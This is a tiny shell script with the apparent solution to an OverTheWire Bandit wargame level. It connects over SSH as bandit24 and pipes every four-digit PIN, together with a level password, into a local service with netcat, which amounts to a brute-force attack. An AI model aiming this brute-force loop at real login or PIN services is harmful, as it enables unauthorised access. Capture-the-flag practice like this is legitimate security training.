#!/bin/bash

ssh bandit24@bandit.labs.overthewire.org -p 2220
#Inside SSH:
for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002
